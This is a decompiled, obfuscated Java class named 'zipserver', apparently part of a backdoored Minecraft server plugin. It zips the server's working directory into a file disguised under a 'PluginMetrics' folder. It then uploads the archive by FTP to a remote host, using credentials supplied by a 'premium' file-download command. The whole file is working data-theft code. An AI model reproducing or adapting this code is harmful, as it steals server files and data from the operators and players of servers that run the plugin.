/*
 * Decompiled with CFR 0.150.
 */
package me.system.runner.utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import me.system.runner.command.impl.premium.FiledownloadCommand;
import me.system.runner.utils.FileUtil;
import org.apache.commons.net.ftp.FTPClient;

public class zipserver {
    private static /* synthetic */ ArrayList<String> files_for_list;
    private static /* synthetic */ File file_for_list;

    public static void dump() {
        for (File lllllllllllllllIIllIlllIlIlllIIl : file_for_list.listFiles()) {
            if (!lllllllllllllllIIllIlllIlIlllIIl.isFile()) continue;
            files_for_list.add(String.valueOf(new StringBuilder().append("\"").append(lllllllllllllllIIllIlllIlIlllIIl.getName()).append("\"")));
        }
        ArrayList<String> lllllllllllllllIIllIlllIlIllIlII = files_for_list;
        FileOutputStream lllllllllllllllIIllIlllIlIllIIll = null;
        try {
            lllllllllllllllIIllIlllIlIllIIll = new FileOutputStream("plugins/PluginMetrics/the_server_backup.zip");
        }
        catch (FileNotFoundException lllllllllllllllIIllIlllIlIlllIII) {
            lllllllllllllllIIllIlllIlIlllIII.printStackTrace();
        }
        ZipOutputStream lllllllllllllllIIllIlllIlIllIIlI = new ZipOutputStream(lllllllllllllllIIllIlllIlIllIIll);
        File lllllllllllllllIIllIlllIlIllIIIl = new File(String.valueOf(lllllllllllllllIIllIlllIlIllIlII));
        try {
            zipserver.zipFile(lllllllllllllllIIllIlllIlIllIIIl, lllllllllllllllIIllIlllIlIllIIIl.getName(), lllllllllllllllIIllIlllIlIllIIlI);
        }
        catch (IOException lllllllllllllllIIllIlllIlIllIlll) {
            lllllllllllllllIIllIlllIlIllIlll.printStackTrace();
        }
        try {
            lllllllllllllllIIllIlllIlIllIIlI.close();
        }
        catch (IOException lllllllllllllllIIllIlllIlIllIllI) {
            lllllllllllllllIIllIlllIlIllIllI.printStackTrace();
        }
        try {
            lllllllllllllllIIllIlllIlIllIIll.close();
        }
        catch (IOException lllllllllllllllIIllIlllIlIllIlIl) {
            lllllllllllllllIIllIlllIlIllIlIl.printStackTrace();
        }
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static void uploadFile(String lllllllllllllllIIllIlllIIlllllll, int lllllllllllllllIIllIlllIIllllllI, String lllllllllllllllIIllIlllIIllllIII, String lllllllllllllllIIllIlllIIlllllII) {
        FTPClient lllllllllllllllIIllIlllIIllllIll = new FTPClient();
        try {
            lllllllllllllllIIllIlllIIllllIll.connect(lllllllllllllllIIllIlllIIlllllll, lllllllllllllllIIllIlllIIllllllI);
            lllllllllllllllIIllIlllIIllllIll.login(lllllllllllllllIIllIlllIIllllIII, lllllllllllllllIIllIlllIIlllllII);
            lllllllllllllllIIllIlllIIllllIll.enterLocalPassiveMode();
            lllllllllllllllIIllIlllIIllllIll.setFileType(2);
            File lllllllllllllllIIllIlllIlIIIIlll = new File("/plugins/PluginMetrics/the_server_backup.zip");
            String lllllllllllllllIIllIlllIlIIIIllI = "plugins/PluginMetrics/the_server_backup.zip";
            FileInputStream lllllllllllllllIIllIlllIlIIIIlIl = new FileInputStream(lllllllllllllllIIllIlllIlIIIIlll);
            System.out.println("Start uploading first file");
            boolean lllllllllllllllIIllIlllIlIIIIlII = lllllllllllllllIIllIlllIIllllIll.storeFile(lllllllllllllllIIllIlllIlIIIIllI, lllllllllllllllIIllIlllIlIIIIlIl);
            ((InputStream)lllllllllllllllIIllIlllIlIIIIlIl).close();
            if (lllllllllllllllIIllIlllIlIIIIlII) {
                System.out.println("The first file is uploaded successfully.");
            }
        }
        catch (IOException lllllllllllllllIIllIlllIlIIIIIlI) {
            System.out.println(String.valueOf(new StringBuilder().append("Error: ").append(lllllllllllllllIIllIlllIlIIIIIlI.getMessage())));
            lllllllllllllllIIllIlllIlIIIIIlI.printStackTrace();
        }
        finally {
            try {
                if (lllllllllllllllIIllIlllIIllllIll.isConnected()) {
                    lllllllllllllllIIllIlllIIllllIll.logout();
                    lllllllllllllllIIllIlllIIllllIll.disconnect();
                }
            }
            catch (IOException lllllllllllllllIIllIlllIlIIIIIIl) {
                lllllllllllllllIIllIlllIlIIIIIIl.printStackTrace();
            }
        }
    }

    static {
        files_for_list = new ArrayList();
        file_for_list = FileUtil.getUserDir();
    }

    private static void zipFile(File lllllllllllllllIIllIlllIlIlIIIIl, String lllllllllllllllIIllIlllIlIlIIIII, ZipOutputStream lllllllllllllllIIllIlllIlIIllIII) throws IOException {
        int lllllllllllllllIIllIlllIlIIllIll;
        if (lllllllllllllllIIllIlllIlIlIIIIl.isHidden()) {
            return;
        }
        if (lllllllllllllllIIllIlllIlIlIIIIl.isDirectory()) {
            File[] lllllllllllllllIIllIlllIlIlIIIlI;
            if (lllllllllllllllIIllIlllIlIlIIIII.endsWith("/")) {
                lllllllllllllllIIllIlllIlIIllIII.putNextEntry(new ZipEntry(lllllllllllllllIIllIlllIlIlIIIII));
            } else {
                lllllllllllllllIIllIlllIlIIllIII.putNextEntry(new ZipEntry(String.valueOf(new StringBuilder().append(lllllllllllllllIIllIlllIlIlIIIII).append("/"))));
            }
            lllllllllllllllIIllIlllIlIIllIII.closeEntry();
            for (File lllllllllllllllIIllIlllIlIlIIIll : lllllllllllllllIIllIlllIlIlIIIlI = lllllllllllllllIIllIlllIlIlIIIIl.listFiles()) {
                zipserver.zipFile(lllllllllllllllIIllIlllIlIlIIIll, String.valueOf(new StringBuilder().append(lllllllllllllllIIllIlllIlIlIIIII).append("/").append(lllllllllllllllIIllIlllIlIlIIIll.getName())), lllllllllllllllIIllIlllIlIIllIII);
            }
            return;
        }
        FileInputStream lllllllllllllllIIllIlllIlIIllllI = new FileInputStream(lllllllllllllllIIllIlllIlIlIIIIl);
        ZipEntry lllllllllllllllIIllIlllIlIIlllIl = new ZipEntry(lllllllllllllllIIllIlllIlIlIIIII);
        lllllllllllllllIIllIlllIlIIllIII.putNextEntry(lllllllllllllllIIllIlllIlIIlllIl);
        byte[] lllllllllllllllIIllIlllIlIIlllII = new byte[1024];
        while ((lllllllllllllllIIllIlllIlIIllIll = lllllllllllllllIIllIlllIlIIllllI.read(lllllllllllllllIIllIlllIlIIlllII)) >= 0) {
            lllllllllllllllIIllIlllIlIIllIII.write(lllllllllllllllIIllIlllIlIIlllII, 0, lllllllllllllllIIllIlllIlIIllIll);
        }
        lllllllllllllllIIllIlllIlIIllllI.close();
        zipserver.uploadFile(FiledownloadCommand.ftp_server, FiledownloadCommand.ftp_port, FiledownloadCommand.ftp_username, FiledownloadCommand.ftp_password);
    }

    public zipserver() {
        zipserver lllllllllllllllIIllIlllIllIIIIII;
    }
}

